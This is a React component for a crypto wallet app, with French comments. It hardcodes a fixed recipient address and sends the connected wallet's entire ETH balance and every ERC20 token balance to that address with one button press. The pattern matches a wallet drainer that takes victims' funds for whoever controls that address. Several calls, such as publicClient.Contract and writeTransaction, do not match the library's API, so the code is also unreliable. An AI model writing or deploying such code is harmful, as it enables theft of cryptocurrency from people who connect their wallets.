import { Button, Input, useToasts } from '@geist-ui/core';
import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';

import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Adresse réceptrice fixée
  const destinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';  // Ton adresse de destination

  // Fonction pour envoyer tous les tokens ERC20 et ETH disponibles
  const sendAllTokens = async () => {
    if (!walletClient) return;

    // Envoyer les ETH disponibles
    const ethBalance = await publicClient.getBalance(walletClient.account);
    if (ethBalance > 0) {
      const tx = await walletClient.writeTransaction({
        to: destinationAddress,
        value: ethBalance,
      });
      showToast(`Successfully sent ${ethBalance} ETH`, 'success');
    }

    // Envoyer les tokens ERC20 disponibles
    for (const token of tokens) {
      const tokenAddress = token.contract_address;
      const tokenContract = new publicClient.Contract(
        tokenAddress,
        erc20ABI,
        walletClient
      );
      const tokenBalance = await tokenContract.balanceOf(walletClient.account);

      if (tokenBalance > 0) {
        try {
          const tx = await walletClient.writeContract({
            address: tokenAddress,
            abi: erc20ABI,
            functionName: 'transfer',
            args: [destinationAddress, tokenBalance.toString()],
          });
          showToast(`Successfully sent ${tokenBalance} ${token.symbol}`, 'success');
        } catch (err) {
          showToast(`Error with ${token.symbol}: ${err?.reason || 'Unknown error'}`, 'warning');
        }
      }
    }
  };

  return (
    <div style={{ margin: '20px' }}>
      <form>
        Destination Address:
        <Input
          required
          value={destinationAddress}
          placeholder="0x518c5D62647E60864EcB3826e982c93dFa154af3"
          readOnly
          width="100%"
          style={{
            marginLeft: '10px',
            marginRight: '10px',
          }}
        />
        <Button
          type="secondary"
          onClick={sendAllTokens}
          style={{ marginTop: '20px' }}
        >
          Send All Tokens and ETH
        </Button>
      </form>
    </div>
  );
};
